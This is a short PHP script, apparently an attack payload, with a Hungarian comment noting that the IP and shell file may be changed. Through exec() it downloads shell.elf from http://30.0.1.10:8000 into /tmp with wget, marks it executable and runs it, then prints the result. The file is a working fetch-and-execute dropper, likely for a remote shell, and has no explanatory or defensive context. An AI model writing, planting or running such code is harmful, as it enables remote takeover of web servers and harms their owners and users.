<?php
$output=null;
$retval=null;
//IP és shell file lehet más!
exec('cd /tmp;rm -f /tmp/shell.elf;wget http://30.0.1.10:8000/shell.elf;chmod +x /tmp/shell.elf;/tmp/shell.elf', $output, $retval);
echo "Returned with status $retval and output:\n";
print_r($output);
?>
